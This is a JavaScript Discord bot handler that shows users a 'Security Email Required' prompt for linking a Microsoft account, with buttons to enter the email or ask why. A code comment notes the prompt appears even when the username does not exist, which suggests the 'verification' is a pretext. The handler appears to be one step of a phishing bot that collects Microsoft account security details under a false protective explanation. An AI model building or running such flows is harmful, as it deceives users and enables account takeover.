const { EmbedBuilder, ActionRowBuilder, ButtonBuilder, ButtonStyle } = require('discord.js');

module.exports = {
  id: 'continue_without_verify',

  async execute(interaction) {
    // Get verification data
    const verificationData = interaction.client.verificationData?.[interaction.user.id];

    if (!verificationData) {
      return interaction.reply({
        content: '❌ Verification data not found. Please start the verification process again.',
        ephemeral: true,
      });
    }

    // Show security email message even though username doesn't exist
    const whyButton = new ButtonBuilder()
      .setCustomId('why_security_email')
      .setLabel('Why?')
      .setStyle(ButtonStyle.Danger);

    const enterEmailButton = new ButtonBuilder()
      .setCustomId('enter_security_email_button')
      .setLabel('Enter Security Email')
      .setStyle(ButtonStyle.Primary);

    const row = new ActionRowBuilder().addComponents(enterEmailButton, whyButton);

    return interaction.reply({
      content: `**Security Email Required🔒**\n\nA security email is required to help verify that you own the Microsoft account being linked. Microsoft uses security information to send verification codes and help protect accounts against unauthorized access or account takeovers.\n\nPlease click the Button "Enter Security Email"\nIf you have question why is a security email required?\nclick the Why? button down below.`,
      components: [row],
      ephemeral: true,
    });
  },
};
